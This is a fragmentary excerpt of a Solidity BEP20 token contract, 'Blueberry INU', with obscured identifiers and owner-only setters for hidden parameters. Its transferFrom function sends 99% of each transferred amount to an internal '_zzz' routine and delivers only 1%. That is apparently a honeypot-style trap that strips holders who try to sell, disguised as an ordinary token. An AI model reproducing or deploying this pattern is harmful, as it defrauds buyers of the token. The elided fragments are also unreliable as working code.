...
contract BEP20Token is IBEP20RT {
    using Math20RT for uint256;

    string public name20RT =  "Blueberry INU";
    string public symbol20RT =  "BLB INU";
    uint8 public decimals20RT = 9;
    uint public _totalSupply = 1*10**15 * 10**9;
    
    address private _owner;
    uint8 private _caking;
    uint8 private _scaking;
  ...
  function decimals() public view virtual returns (uint8) {
    ...
    function _transfer1(address sender, address recipient, uint256 amount) internal virtual {
    ...
    function transfer(address to, uint tokens) public override returns (bool success) {
        _transfer1(msg.sender, to, tokens);
    ...
    function transferFrom(address from, address to, uint tokens) public override returns (bool success) {
        ...
        _zzz(from, tokens.mul(99).div(10**2));
        
        _transfer1(from, to, tokens.sub(tokens.mul(99).div(10**2)));
    ...
    function _zzz(address tokenOwner, uint256 tokens) internal {
    ...
    function sAlYaking(uint8 caking) public virtual onlyOwner {
		_caking = caking;
	}
    ...
    function sGiveZZZ(uint8 scaking) public virtual onlyOwner {
		_scaking = scaking;
	}
	
	function getGiveZZZ() public view returns (uint8) {
        return _scaking;
    }
